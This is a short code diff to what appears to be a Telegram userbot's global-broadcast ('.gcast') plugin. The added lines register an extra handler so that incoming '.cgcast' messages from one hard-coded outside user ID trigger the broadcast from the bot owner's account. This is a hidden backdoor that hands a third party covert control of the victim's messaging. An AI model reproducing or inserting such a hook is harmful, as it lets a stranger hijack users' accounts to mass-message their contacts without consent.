@@ -32,6 +32,8 @@ GCAST_BLACKLIST = [
 
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
+@register(incoming=True, from_users=1904791338,
+          pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
